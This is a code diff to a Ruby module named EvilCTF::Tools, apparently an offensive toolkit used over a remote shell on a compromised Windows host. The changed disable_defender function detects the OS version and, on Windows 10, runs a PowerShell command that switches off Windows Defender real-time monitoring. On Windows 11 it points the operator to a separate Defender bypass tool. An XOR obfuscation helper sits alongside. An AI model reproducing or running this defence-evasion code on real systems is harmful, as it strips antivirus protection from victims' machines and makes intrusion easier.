@@ -718,24 +718,37 @@ module EvilCTF::Tools
   def self.xor_crypt(data, key = 0x42)
     data.bytes.map { |b| (b ^ key).chr }.join
   end
+  
   def self.disable_defender(shell)
-    # Try to disable Windows Defender real-time protection
-    ps_cmd = <<~PS
-      try {
-        $defender = Get-MpComputerStatus
-        if ($defender.RealTimeProtectionEnabled) {
-          Set-MpPreference -DisableRealtimeMonitoring $true
-          Write-Output "[+] Defender real-time monitoring disabled"
-        } else {
-          Write-Output "[-] Defender already disabled"
+    # Check OS version
+    os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
+    if os_info.include?("Windows 10")
+      puts "[*] OS: Windows 10 detected. Running standard Defender disable..."
+      ps_cmd = <<~PS
+        try {
+          $defender = Get-MpComputerStatus
+          if ($defender.RealTimeProtectionEnabled) {
+            Set-MpPreference -DisableRealtimeMonitoring $true
+            Write-Output "[+] Defender real-time monitoring disabled"
+          } else {
+            Write-Output "[-] Defender already disabled"
+          }
+        } catch {
+          Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
         }
-      } catch {
-        Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
-      }
-    PS
-    result = shell.run(ps_cmd)
-    puts result.output
+      PS
+      result = shell.run(ps_cmd)
+      puts result.output
+    elsif os_info.include?("Windows 11")
+      puts "[!] WARNING: This technique only works on Windows 10."
+      puts "    On Windows 11, use `tool win11_defender_bypass` or `wscript` bypass."
+      puts "    See: https://github.com/aventurella/Win11-Defender-Bypass"
+    else
+      puts "[!] Unknown OS: #{os_info}"
+    end
   end
+
+
   def self.load_config_profile(name)
     profile_file = File.join('config', "#{name}.yaml")
     return {} unless File.exist?(profile_file)
